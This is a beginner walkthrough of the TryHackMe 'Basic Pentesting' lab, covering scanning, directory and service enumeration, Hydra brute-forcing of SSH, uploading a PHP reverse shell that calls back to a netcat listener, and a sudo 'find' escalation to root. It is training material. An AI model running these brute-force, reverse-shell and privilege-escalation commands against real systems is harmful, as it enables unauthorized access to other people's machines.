1. TryHackMe: Basic Pentesting Walkthrough

This writeup documents the steps to complete the **Basic Pentesting** room on TryHackMe (https://tryhackme.com/room/basicpentestingjt), a beginner-friendly CTF that teaches reconnaissance, enumeration, exploitation, and privilege escalation on a Linux-based machine. The goal is to find two flags: a user flag and a root flag.

## Prerequisites

- **Tools**: Kali Linux or TryHackMe’s attack box with `nmap`, `gobuster`, `hydra`, `smbclient`, `ftp`, and `netcat`.
- **Setup**: Connect to TryHackMe’s VPN using OpenVPN (`openvpn your-config.ovpn`).
- **Knowledge**: Basic Linux commands (`ls`, `cat`, `find`, `sudo`) and familiarity with pentesting workflow.

## Step 1: Reconnaissance with Nmap

**Objective**: Identify open ports and services on the target machine.

1. Deploy the target VM in TryHackMe and note its IP (e.g., `10.10.x.x`).
2. Run an Nmap scan to discover open ports and services:

   ```bash
   nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
   ```
   - `-sC`: Default scripts for service detection.
   - `-sV`: Version detection.
   - `-oN`: Save output to `nmap_scan.txt`.
3. **Findings**: Typical results include:
   - Port 21 (FTP): Anonymous login allowed.
   - Port 22 (SSH): OpenSSH.
   - Port 80 (HTTP): Apache web server.
   - Port 139/445 (SMB): Samba server.

**Tip**: Save Nmap output for reference. Use `-A` for a more aggressive scan if needed, but it’s slower.

## Step 2: Enumeration

### 2.1 Web Enumeration (Port 80)

**Objective**: Find hidden directories or files on the web server.

1. Access the web server: `http://<TARGET_IP>` in a browser or `curl http://<TARGET_IP>`.
2. Run Gobuster to enumerate directories:

   ```bash
   gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
   ```
   - `-u`: Target URL.
   - `-w`: Wordlist path (use `common.txt` for faster scans).
   - `-o`: Save output.
3. **Findings**: Discovered directories like `/development` or `/dev`.
4. Explore `/development`:
   - Found files like `dev.txt` and `j.txt` containing notes or hints about users/credentials.

**Tip**: Check `robots.txt` (`curl http://<TARGET_IP>/robots.txt`) for disallowed paths. Use `-x php,html` in Gobuster to find specific file types.

### 2.2 FTP Enumeration (Port 21)

**Objective**: Check for anonymous FTP access.

1. Connect to FTP anonymously:

   ```bash
   ftp <TARGET_IP>
   ```
   - Username: `anonymous`
   - Password: (empty or `guest`)
2. List files: `ls`
3. Download files:

   ```bash
   get dev.txt
   get j.txt
   ```
4. Exit FTP: `bye`
5. Read files locally:

   ```bash
   cat dev.txt
   cat j.txt
   ```
6. **Findings**: Files reveal usernames (e.g., `jan`) and potential passwords or hints.

**Tip**: If anonymous login fails, try brute-forcing FTP with Hydra later.

### 2.3 SMB Enumeration (Ports 139/445)

**Objective**: Identify accessible SMB shares.

1. List SMB shares:

   ```bash
   smbclient -L //<TARGET_IP> -N
   ```
   - `-N`: No password (anonymous access).
2. Connect to a share (e.g., `anonymous`):

   ```bash
   smbclient //<TARGET_IP>/anonymous -N
   ```
3. Download files: `get <file>`.
4. **Findings**: Similar files as FTP, confirming usernames or passwords.

**Tip**: Use `enum4linux -a <TARGET_IP>` for deeper SMB enumeration (users, groups, shares).

## Step 3: Exploitation

### 3.1 SSH Login with Credentials

**Objective**: Gain initial access using credentials from enumerated files.

1. From `dev.txt` or `j.txt`, identify a username (e.g., `jan`) and password (e.g., a weak password like `armando`).
2. Log in via SSH:

   ```bash
   ssh jan@<TARGET_IP>
   ```
3. **Result**: Successful login as user `jan`.

**Alternative**: If credentials are missing, brute-force SSH with Hydra:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Tip**: Save credentials in a text file (`creds.txt`) for reference. Double-check password case sensitivity.

### 3.2 Web Exploitation (Optional)

**Objective**: Check for web vulnerabilities if SSH fails.

1. If `/development` has a login page, test credentials found earlier.
2. If a file upload feature exists, upload a PHP reverse shell:
   - Download: `wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`
   - Edit `php-reverse-shell.php` to set your attack box IP (`ifconfig tun0`) and port (e.g., `9001`).
   - Upload via the web interface.
3. Set up a Netcat listener:

   ```bash
   nc -lvnp 9001
   ```
4. Trigger the shell: `curl http://<TARGET_IP>/path/shell.php`.
5. **Result**: Shell access as the web server user (likely `www-data`).

**Tip**: Ensure your VPN is active to match IPs. Test the shell URL in a browser if `curl` fails.

## Step 4: Privilege Escalation

**Objective**: Escalate from user `jan` to root to find the root flag.

1. Check user privileges:

   ```bash
   whoami
   id
   sudo -l
   ```
2. **Findings**: `sudo -l` shows `jan` can run `find` as root without a password.
3. Exploit `find` to gain a root shell:

   ```bash
   sudo find / -exec /bin/sh \; -quit
   ```
   - This runs `sh` as root, giving a root prompt.
4. Verify root access:

   ```bash
   whoami
   ```
   - Output: `root`.
5. Find flags:

   ```bash
   cat /home/jan/user.txt
   cat /root/root.txt
   ```

**Alternative Privesc**:

- Check for SUID binaries:

  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- Use tools like LinPEAS for automated checks:

  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

**Tip**: Always check `sudo -l` first for low-hanging privesc. GTFOBins (https://gtfobins.github.io/) lists exploits for commands like `find`.

## Step 5: Submitting Flags

- Copy the `user.txt` and `root.txt` contents (format: `THM{...}`).
- Submit in TryHackMe’s task interface for each question.
- **Note**: Exact flags are not shared here to avoid spoilers.

## Lessons Learned

- **Recon**: Nmap is critical for identifying attack surfaces.
- **Enumeration**: Check all services (web, FTP, SMB) thoroughly for credentials or misconfigurations.
- **Exploitation**: Weak credentials and anonymous access are common in beginner CTFs.
- **Privilege Escalation**: `sudo` misconfigurations are a frequent privesc vector.
- **Tools Used**: Nmap, Gobuster, smbclient, ftp, Hydra, Netcat, SSH.

## Challenges Faced

- **Slow Scans**: Use smaller wordlists (`common.txt`) or specific Nmap flags (`-T4`) for speed.
- **Permission Denied**: Ensure you’re in the correct directory or have escalated privileges.
- **Shell Issues**: Verify listener IP/port and VPN connectivity.

## Resources

- Nmap Cheat Sheet: https://www.stationx.net/nmap-cheat-sheet/
- Gobuster Guide: https://www.kali.org/tools/gobuster/
- Hydra Guide: https://www.kali.org/tools/hydra/
- GTFOBins: https://gtfobins.github.io/
- Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/
- TryHackMe Community: https://discord.gg/tryhackme

## Next Steps

- Try **Vulnversity** (https://tryhackme.com/room/vulnversity) for web-focused pentesting.
- Practice Linux commands in **Learn Linux** (https://tryhackme.com/room/zthlinux).
- Create a GitHub repo for writeups to track progress.

*Uploaded to GitHub by \[Your GitHub Username\] on \[Date\].*